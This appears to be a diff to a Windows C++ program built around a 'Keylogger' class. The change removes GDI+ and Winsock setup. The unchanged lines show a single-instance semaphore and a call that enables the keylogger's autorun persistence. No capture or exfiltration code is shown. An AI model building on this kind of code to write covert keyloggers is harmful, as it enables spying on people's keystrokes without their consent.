@@ -3,10 +3,6 @@
 #include "Hax.h"
 #include "Keylogger.h"
 
-#pragma comment(lib, "gdiplus.lib")
-#pragma comment(lib, "Ws2_32.lib")
-
-using namespace Gdiplus;
 
 TCHAR semName[] = _T("VSem");
 
@@ -19,10 +15,6 @@ int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCm
         CloseHandle(hSem);
         return 0;
     }
-
-    GdiplusStartupInput gdiplusStartupInput;
-    ULONG_PTR           gdiplusToken;
-    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
 
     keylogger.SetAutorun(true);
 #ifdef _DEBUG
